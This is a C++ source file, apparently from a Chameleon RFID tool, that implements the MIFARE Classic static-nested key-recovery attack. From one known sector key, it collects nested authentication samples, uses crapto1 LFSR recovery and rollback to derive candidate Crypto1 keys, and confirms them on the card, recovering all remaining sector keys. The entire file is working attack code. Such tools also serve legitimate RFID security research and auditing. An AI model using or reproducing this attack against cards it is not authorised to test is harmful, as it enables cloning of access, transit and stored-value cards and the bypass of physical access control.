#include "MfcStaticNestedRecovery.h"
#include <cstdlib>
#include <cstring>
#include <cstdio>
#include "utils/ble/ChameleonClient.h"
extern "C" {
#include "utils/crypto/crapto1.h"
}
namespace MfcStaticNestedRecovery {
namespace {
constexpr uint32_t kMaxRecoveryCandidates = 100000;
uint8_t trailerBlock(uint8_t s) { return s < 32 ? s * 4 + 3 : 128 + (s - 32) * 16 + 15; }
void emit(LogFn fn, void* ctx, const char* msg, LogLevel level) { if (fn) fn(msg, level, ctx); }
}
Result run(uint8_t sectors, const uint8_t uid[7], uint8_t uidLen,
           const bool foundA[40], const bool foundB[40], const uint8_t keysA[40][6], const uint8_t keysB[40][6],
           LogFn log, ProgressFn progress, void* ctx) {
  Result r; memcpy(r.foundA,foundA,sizeof(r.foundA)); memcpy(r.foundB,foundB,sizeof(r.foundB)); memcpy(r.keysA,keysA,sizeof(r.keysA)); memcpy(r.keysB,keysB,sizeof(r.keysB));
  if (sectors > 40) sectors=40; auto& c=ChameleonClient::get(); char m[80];
  int knownSec=-1; uint8_t knownKType=0; uint64_t knownKey64=0;
  for(uint8_t s=0;s<sectors&&knownSec<0;s++){ if(r.foundA[s]){knownSec=s;knownKType=0x60;for(int i=0;i<6;i++)knownKey64=(knownKey64<<8)|r.keysA[s][i];} else if(r.foundB[s]){knownSec=s;knownKType=0x61;for(int i=0;i<6;i++)knownKey64=(knownKey64<<8)|r.keysB[s][i];}}
  if(knownSec<0){emit(log,ctx,"No known key to exploit",LogLevel::Error);return r;}
  emit(log,ctx,"Known key selected",LogLevel::Info);
  uint8_t ntLevel=0; if(!c.mf1NTLevel(&ntLevel)||ntLevel!=1){
    emit(log,ctx,"Static nonce not detected",ntLevel==0?LogLevel::Error:LogLevel::Warning);return r;
  } emit(log,ctx,"Static nonce detected",LogLevel::Success); r.started=true;
  uint8_t exploitBlock=trailerBlock((uint8_t)knownSec), knownKeyBytes[6]; {uint64_t t=knownKey64;for(int i=5;i>=0;i--){knownKeyBytes[i]=(uint8_t)(t&0xff);t>>=8;}}
  uint32_t uid32=0;for(int i=0;i<4&&i<(int)uidLen;i++)uid32=(uid32<<8)|uid[i]; snprintf(m,sizeof(m),"uid32 = %08lX",(unsigned long)uid32);emit(log,ctx,m,LogLevel::Debug);
  int totalTargets=0;for(uint8_t s=0;s<sectors;s++)for(int kt=0;kt<2;kt++)if(!((kt==0)?r.foundA[s]:r.foundB[s]))totalTargets++; int done=0;
  for(uint8_t targetSec=0;targetSec<sectors;targetSec++)for(int kt=0;kt<2;kt++){
    uint8_t tKType=kt==0?0x60:0x61; char tkc=kt==0?'A':'B'; uint8_t tBlock=trailerBlock(targetSec);
    if((kt==0)?r.foundA[targetSec]:r.foundB[targetSec]){done++;continue;} if((int)targetSec==knownSec&&tKType==knownKType){done++;continue;}
    if(progress){snprintf(m,sizeof(m),"Collecting samples...");progress(m,totalTargets?(done*100)/totalTargets:0,ctx);}

    ChameleonClient::NestedSample samples[2];int gotN=0;bool collected=false;for(int attempt=0;attempt<3&&!collected;attempt++){if(c.mf1StaticNestedAcquire(knownKType,exploitBlock,knownKeyBytes,tKType,tBlock,nullptr,samples,2,&gotN)&&gotN>=1){collected=true;if(progress){snprintf(m,sizeof(m),"Collecting samples...");int pct=totalTargets?(done*100)/totalTargets+(100/(2*totalTargets)):0;if(pct>100)pct=100;progress(m,pct,ctx);}}}
    if(!collected){snprintf(m,sizeof(m),"Sector %d Key %c: collection failed",targetSec,tkc);emit(log,ctx,m,LogLevel::Error);done++;continue;}
    uint32_t staticNt=samples[0].nt,encNt2=samples[0].ntEnc,ks=encNt2^staticNt; if(progress){snprintf(m,sizeof(m),"Recovering keys (%d/%d)...",done+1,totalTargets);progress(m,totalTargets?(done*100)/totalTargets:0,ctx);}
    Crypto1State* revstate=lfsr_recovery32(ks,staticNt^uid32);if(!revstate){snprintf(m,sizeof(m),"S%d %c: lfsr null (Nt=%08lX ks=%08lX)",targetSec,tkc,(unsigned long)staticNt,(unsigned long)ks);emit(log,ctx,m,LogLevel::Debug);snprintf(m,sizeof(m),"Sector %d Key %c not recovered",targetSec,tkc);emit(log,ctx,m,LogLevel::Error);done++;continue;}
    int candCount=0;for(Crypto1State*p=revstate;p->odd!=0||p->even!=0;p++)candCount++; bool found=false,capped=false;Crypto1State*rs=revstate;int checked=0,verified=0;
    while((rs->odd!=0||rs->even!=0)&&!found){lfsr_rollback_word(rs,staticNt^uid32,0);uint64_t cand;crypto1_get_lfsr(rs,&cand);Crypto1State*test=crypto1_create(cand);crypto1_word(test,uid32^staticNt,0);uint32_t testKs=crypto1_word(test,0,0);crypto1_destroy(test);bool softOk=((encNt2^staticNt)==testKs);if(softOk){uint8_t b[6];uint64_t t=cand;for(int i=5;i>=0;i--){b[i]=(uint8_t)(t&0xff);t>>=8;}verified++;if(c.mf1CheckKey(tBlock,tKType,b)){if(kt==0){memcpy(r.keysA[targetSec],b,6);r.foundA[targetSec]=true;}else{memcpy(r.keysB[targetSec],b,6);r.foundB[targetSec]=true;}r.recovered++;found=true;}}rs++;if(++checked>kMaxRecoveryCandidates){capped=true;break;}}
    free(revstate);if(found){uint8_t*k=kt==0?r.keysA[targetSec]:r.keysB[targetSec];snprintf(m,sizeof(m),"S%d %c: KEY %02X%02X%02X%02X%02X%02X (cand=%d soft=%d)",targetSec,tkc,k[0],k[1],k[2],k[3],k[4],k[5],candCount,verified);emit(log,ctx,m,LogLevel::Debug);snprintf(m,sizeof(m),"Sector %d Key %c recovered",targetSec,tkc);emit(log,ctx,m,LogLevel::Success);}else{snprintf(m,sizeof(m),"S%d %c: no key (cand=%d soft=%d%s)",targetSec,tkc,candCount,verified,capped?" CAPPED":"");emit(log,ctx,m,LogLevel::Debug);snprintf(m,sizeof(m),"Sector %d Key %c not recovered",targetSec,tkc);emit(log,ctx,m,LogLevel::Error);}done++;
  }
  r.success=r.recovered>0;return r;
}
}
